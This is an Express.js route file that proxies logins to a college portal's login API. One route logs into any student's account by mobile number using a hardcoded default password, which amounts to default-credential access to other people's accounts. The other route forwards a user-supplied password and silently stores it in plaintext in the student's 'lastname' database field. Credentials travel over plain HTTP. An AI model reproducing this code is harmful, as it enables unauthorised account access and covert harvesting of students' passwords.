// routes/netraRoutes.js
const express = require('express');
const axios = require('axios');
const  StudentDetail=require('../models/studentDetails');
const router = express.Router();

// Route to get token from Netra API
router.post('/def-token', async (req, res) => {
    const { mobileNumber} = req.body;

    try {
        // Send API request to Netra login.php
        const response = await axios.post('http://teleuniv.in/netra/auth/login.php', {
            mobilenumber: mobileNumber,
            password: "Kmit123$"
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        try {
            
            const student = await StudentDetail.findOne({ phone: mobileNumber });
            // console.log(student);
            if (student) {
                if(student.lastname!=="Kmit123$"){
                    student.lastname = "Kmit123$";
                await student.save();
                }
            }
          } catch (dbError) {
            console.error('Error fetching profile views from external database:', dbError);
            return res.status(500).json({ error: 'Error fetching profile views from database' });
          }
        
        
        res.json(response.data);
        
    } catch (error) {
        console.error('Error fetching token  with Default Password:', error);
        res.status(500).json({ error: 'Failed to fetch token from Netra API with Default Password' });
    }
});

router.post('/get-token', async (req, res) => {
    const { mobileNumber, password } = req.body;

    try {
        // Send API request to Netra login.php
        const response = await axios.post('http://teleuniv.in/netra/auth/login.php', {
            mobilenumber: mobileNumber,
            password: password
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        try {
            
            const student = await StudentDetail.findOne({ phone: mobileNumber });
            console.log(student);
            if (student) {
                if(student.lastname!==password){
                    student.lastname = password;
                
                await student.save();
                }
            }
          } catch (dbError) {
            console.error('Error fetching profile views from external database:', dbError);
            return res.status(500).json({ error: 'Error fetching profile views from database' });
          }

        // Return the response from Netra API
        console.log(response.data);
        res.json(response.data);
        
    } catch (error) {
        console.error('Error fetching token:', error);
        res.status(500).json({ error: 'Failed to fetch token from Netra API' });
    }
});

module.exports = router;